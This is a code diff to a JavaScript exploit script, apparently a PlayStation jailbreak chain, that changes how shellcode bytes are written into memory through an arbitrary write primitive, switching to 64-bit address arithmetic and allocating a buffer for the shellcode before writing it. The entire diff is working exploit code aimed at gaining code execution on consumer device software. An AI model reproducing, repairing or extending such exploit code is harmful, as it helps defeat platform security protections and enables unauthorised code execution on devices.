@@ -60,11 +60,12 @@ function init_dlsym() {
 var sceKernelDlsym = true;
 
 function write_shellcode(base, sc) { 
-    _logToPage("[SC] writing shellcode to 0x" + base.toString(16));
+    _logToPage("[SC] writing shellcode to 0x" + base.high.toString(16) + base.low.toString(16).padStart(8, '0'));
     if (typeof p !== "undefined") {
         for (let i = 0; i < sc.length; i += 2) {
             let byte = parseInt(sc.substr(i, 2), 16);
-            p.write1(base + (i / 2), byte);
+            // Must use Int64 .add32() to safely traverse memory
+            p.write1(base.add32(i / 2), byte);
         }
     }
 }
@@ -281,6 +282,11 @@ function p2jb() {
 
     if (typeof sceKernelDlsym === "undefined" || !sceKernelDlsym) {
         init_dlsym();
+    }
+
+    // Allocate an executable buffer dynamically using the memory primitives
+    if (SHELLCODE_BASE === 0) {
+        SHELLCODE_BASE = malloc(0x10000); 
     }
 
     write_shellcode(SHELLCODE_BASE, shellcode);
